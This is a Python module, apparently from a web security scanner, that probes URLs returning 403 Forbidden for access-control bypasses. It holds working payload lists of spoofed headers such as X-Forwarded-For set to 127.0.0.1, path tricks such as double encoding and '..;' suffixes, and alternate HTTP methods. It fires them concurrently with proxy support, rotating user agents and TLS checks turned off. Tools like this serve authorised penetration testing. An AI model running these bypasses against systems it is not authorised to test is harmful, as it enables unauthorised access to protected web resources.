"""403 Forbidden bypass tester.

Tests multiple bypass techniques against URLs that return 403:
- Header injection tricks (X-Forwarded-For, X-Original-URL, etc.)
- Path manipulation (double encoding, trailing dot, slash tricks, etc.)
- HTTP method switching (GET → POST, HEAD, etc.)

Reports which bypass techniques successfully return a non-403 response.
"""

import asyncio
import json
import logging
import random

import aiohttp
from colorama import Fore, Style
from tqdm import tqdm

from vortex.utils import stop_event, display_banner
from vortex.user_agents import USER_AGENTS

# Header-based bypass techniques
_BYPASS_HEADERS: list[dict[str, str]] = [
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Forwarded-For": "localhost"},
    {"X-Forwarded-For": "::1"},
    {"X-Real-IP": "127.0.0.1"},
    {"X-Custom-IP-Authorization": "127.0.0.1"},
    {"X-Originating-IP": "127.0.0.1"},
    {"X-Remote-IP": "127.0.0.1"},
    {"X-Remote-Addr": "127.0.0.1"},
    {"X-ProxyUser-Ip": "127.0.0.1"},
    {"X-Original-URL": "/"},
    {"X-Rewrite-URL": "/"},
    {"X-Override-URL": "/"},
    {"X-HTTP-DestinationURL": "/"},
    {"Referer": "https://google.com"},
    {"Referer": "/"},
    {"X-Forwarded-Host": "localhost"},
    {"X-Host": "localhost"},
    {"X-HTTP-Method-Override": "GET"},
    {"X-Method-Override": "GET"},
    {"_method": "GET"},
]

# Path manipulation bypass techniques (appended to base path)
_PATH_BYPASSES: list[str] = [
    "/%2e/",
    "/./",
    "//",
    "/./.",
    "/%20",
    "/%09",
    "/..;/",
    "/.%00/",
    "/%2f/",
    "/..",
    "/;/",
    "/?",
    "/*",
    "/%252f/",
    "/%2e%2e/",
    "/.json",
    ".json",
    "%20",
    "..;",
    "/.html",
]

# HTTP methods to test
_BYPASS_METHODS = ["POST", "HEAD", "OPTIONS", "PUT", "PATCH", "TRACE"]


async def _test_header_bypass(
    session,
    url: str,
    bypass_headers: dict[str, str],
    proxy=None,
    timeout: float = 10,
    random_ua: bool = False,
) -> dict | None:
    """Test a single header bypass technique. Returns finding dict or None."""
    req_kwargs = {}
    if proxy:
        req_kwargs["proxy"] = proxy

    headers = {"User-Agent": random.choice(USER_AGENTS) if random_ua else "Mozilla/5.0"}
    headers.update(bypass_headers)

    try:
        async with session.get(
            url,
            headers=headers,
            timeout=aiohttp.ClientTimeout(total=timeout),
            allow_redirects=False,
            **req_kwargs,
        ) as resp:
            if resp.status not in (403, 401, 404):
                return {
                    "url": url,
                    "technique": "header",
                    "detail": str(bypass_headers),
                    "status": resp.status,
                    "severity": "MEDIUM",
                }
    except Exception as exc:
        logging.debug(f"403 header bypass error for {url}: {exc}")
    return None


async def _test_path_bypass(
    session,
    url: str,
    path_suffix: str,
    proxy=None,
    timeout: float = 10,
    random_ua: bool = False,
) -> dict | None:
    """Test a single path manipulation bypass technique."""
    req_kwargs = {}
    if proxy:
        req_kwargs["proxy"] = proxy

    headers = {"User-Agent": random.choice(USER_AGENTS) if random_ua else "Mozilla/5.0"}

    test_url = url.rstrip("/") + path_suffix

    try:
        async with session.get(
            test_url,
            headers=headers,
            timeout=aiohttp.ClientTimeout(total=timeout),
            allow_redirects=False,
            **req_kwargs,
        ) as resp:
            if resp.status not in (403, 401, 404):
                return {
                    "url": url,
                    "tested_url": test_url,
                    "technique": "path",
                    "detail": f"path suffix: {path_suffix!r}",
                    "status": resp.status,
                    "severity": "MEDIUM",
                }
    except Exception as exc:
        logging.debug(f"403 path bypass error for {test_url}: {exc}")

    return None


async def _test_method_bypass(
    session,
    url: str,
    method: str,
    proxy=None,
    timeout: float = 10,
    random_ua: bool = False,
) -> dict | None:
    """Test an HTTP method change bypass."""
    req_kwargs = {}
    if proxy:
        req_kwargs["proxy"] = proxy

    headers = {"User-Agent": random.choice(USER_AGENTS) if random_ua else "Mozilla/5.0"}

    try:
        async with session.request(
            method,
            url,
            headers=headers,
            timeout=aiohttp.ClientTimeout(total=timeout),
            allow_redirects=False,
            **req_kwargs,
        ) as resp:
            if resp.status not in (403, 401, 404, 405):
                return {
                    "url": url,
                    "technique": "method",
                    "detail": f"HTTP {method}",
                    "status": resp.status,
                    "severity": "MEDIUM",
                }
    except Exception as exc:
        logging.debug(f"403 method bypass error for {url} ({method}): {exc}")
    return None


async def _check_url(
    url: str,
    proxy=None,
    timeout: float = 10,
    random_ua: bool = False,
    rate_limit=None,
) -> list[dict]:
    """Run all bypass techniques against a single URL."""
    findings = []
    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False)) as session:
        for bypass_headers in _BYPASS_HEADERS:
            if stop_event.is_set():
                return findings
            result = await _test_header_bypass(session, url, bypass_headers, proxy, timeout, random_ua)
            if result:
                findings.append(result)
            if rate_limit:
                await asyncio.sleep(1.0 / rate_limit)

        for path_suffix in _PATH_BYPASSES:
            if stop_event.is_set():
                return findings
            result = await _test_path_bypass(session, url, path_suffix, proxy, timeout, random_ua)
            if result:
                findings.append(result)
            if rate_limit:
                await asyncio.sleep(1.0 / rate_limit)

        for method in _BYPASS_METHODS:
            if stop_event.is_set():
                return findings
            result = await _test_method_bypass(session, url, method, proxy, timeout, random_ua)
            if result:
                findings.append(result)
            if rate_limit:
                await asyncio.sleep(1.0 / rate_limit)

    return findings


async def bypass_403(
    urls,
    output_file=None,
    output_format="txt",
    proxy=None,
    timeout: float = 10,
    random_ua: bool = False,
    rate_limit=None,
    max_threads: int = 20,
):
    """Test *urls* for 403 Forbidden bypass vulnerabilities.

    Parameters
    ----------
    urls : list[str]
        Target URLs to test (should be URLs that return 403).
    output_file : str or None
        Path to write results.
    output_format : str
        ``'json'`` or ``'txt'``.

    Returns
    -------
    list[dict]
        Bypass findings.
    """
    display_banner()
    print(
        f"{Fore.CYAN}[*] Testing {len(urls)} URL(s) for 403 bypass "
        f"({len(_BYPASS_HEADERS)} header + {len(_PATH_BYPASSES)} path + "
        f"{len(_BYPASS_METHODS)} method techniques)...{Style.RESET_ALL}"
    )

    all_findings: list[dict] = []
    sem = asyncio.Semaphore(max_threads)

    async def handle(url, pbar):
        if stop_event.is_set():
            pbar.update(1)
            return
        async with sem:
            findings = await _check_url(url, proxy, timeout, random_ua, rate_limit)
            for f in findings:
                tqdm.write(
                    f"{Fore.YELLOW}[!] 403 Bypass [{f['severity']}]: {f['url']} | "
                    f"technique={f['technique']} | {f['detail']} → HTTP {f['status']}{Style.RESET_ALL}"
                )
            all_findings.extend(findings)
        pbar.update(1)

    with tqdm(total=len(urls), desc="403 Bypass", ncols=80) as pbar:
        await asyncio.gather(*[handle(u, pbar) for u in urls])

    if not all_findings:
        print(f"{Fore.GREEN}[✔] No 403 bypass techniques succeeded.{Style.RESET_ALL}")

    if output_file and all_findings:
        with open(output_file, "w", encoding="utf-8") as fh:
            if output_format == "json":
                json.dump(all_findings, fh, indent=2)
            else:
                for f in all_findings:
                    fh.write(
                        f"[{f['severity']}] {f['url']} | technique={f['technique']} | "
                        f"{f['detail']} → HTTP {f['status']}\n"
                    )

    print(
        f"{Fore.CYAN}[✔] 403 bypass test complete — {len(all_findings)} bypass(es) found.{Style.RESET_ALL}"
    )
    return all_findings
